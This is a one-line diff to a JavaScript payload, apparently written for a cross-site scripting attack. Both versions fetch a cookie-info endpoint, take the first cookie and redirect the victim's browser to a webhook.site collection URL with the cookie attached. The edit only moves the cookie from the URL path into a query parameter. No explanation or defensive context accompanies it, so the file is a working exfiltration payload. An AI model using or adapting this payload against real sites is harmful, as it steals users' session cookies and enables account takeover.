@@ -1,1 +1,1 @@
-fetch("/api/v1/my_cookie_info").then((response) => response.json()).then((data) => {var cookie = data.cookies[0]; location.href = "https://webhook.site/6f921727-420f-41a3-94c9-dab4e92db613/" + cookie;});
+fetch("/api/v1/my_cookie_info").then((response) => response.json()).then((data) => {var cookie = data.cookies[0]; location.href = "https://webhook.site/6f921727-420f-41a3-94c9-dab4e92db613?p="+cookie;});
